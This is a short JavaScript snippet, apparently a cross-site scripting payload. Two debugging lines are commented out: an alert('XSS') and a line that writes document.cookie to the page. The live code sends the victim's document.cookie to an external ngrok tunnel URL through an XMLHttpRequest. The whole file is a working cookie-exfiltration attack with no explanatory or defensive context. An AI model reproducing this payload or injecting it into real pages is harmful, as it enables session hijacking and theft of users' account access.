//alert("XSS");
//document.write(document.cookie)

var request = new XMLHttpRequest();
request.open('GET', 'https://84dc-90-173-214-195.ngrok.io/?cookie=' + document.cookie);
request.send();